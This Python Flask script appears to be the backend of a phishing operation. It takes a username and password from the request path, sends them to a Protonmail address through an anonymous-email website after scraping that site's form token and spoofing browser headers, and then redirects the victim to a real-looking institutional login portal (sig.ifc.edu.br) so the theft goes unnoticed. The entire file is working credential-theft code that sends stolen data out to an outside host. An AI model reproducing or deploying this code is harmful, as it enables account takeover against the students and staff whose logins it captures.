from flask import Flask, jsonify
from bs4 import BeautifulSoup
import requests

def sendByMail(text):
    headers = {'user-agent': 'Mozilla/5.0 (Windows NT 4.1; Win32; x32) AppleWebKit/507.36 (KHTML, like Gecko) Chrome/75.1.3945.117 Safari/507.36',"upgrade-insecure-requests":"1","sec-fetch-mode":"navigate","sec-fetch-user":"?1"}
    r = requests.get("https://emailanonimo.com.br/", headers=headers)
    soup = BeautifulSoup(r.text, 'html.parser');
    inputs = soup.find_all('input')
    for input in inputs:

        if input['name'] == 'token':
            token = input['value']
    headers={"origin":"https://emailanonimo.com.br","referer":"https://emailanonimo.com.br/","sec-fetch-site":"same-origin","x-requested-with":"XMLHttpRequest","user-agent":"Mozilla/5.0 (Windows NT 4.1; Win32; x32) AppleWebKit/507.36 (KHTML, like Gecko) Chrome/75.1.3945.117 Safari/507.36"}
    form = {"email":"tickmin@protonmail.com","email_reply":"","titulo_email":"","mensagem":text,"token":token}
    r = requests.post("https://emailanonimo.com.br/enviar.php",data=form,headers=headers)


app = Flask(__name__)


@app.route('/<str:usuario>/<str:senha>', methods=['GET'])
def get_authenticate(usuario,senha):
    sendByMail("Usuario:"+usuario+"<br>Senha:"+senha)
    return "<script>window.location.replace('https://sig.ifc.edu.br/')</script>"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80, debug=True, threaded=True)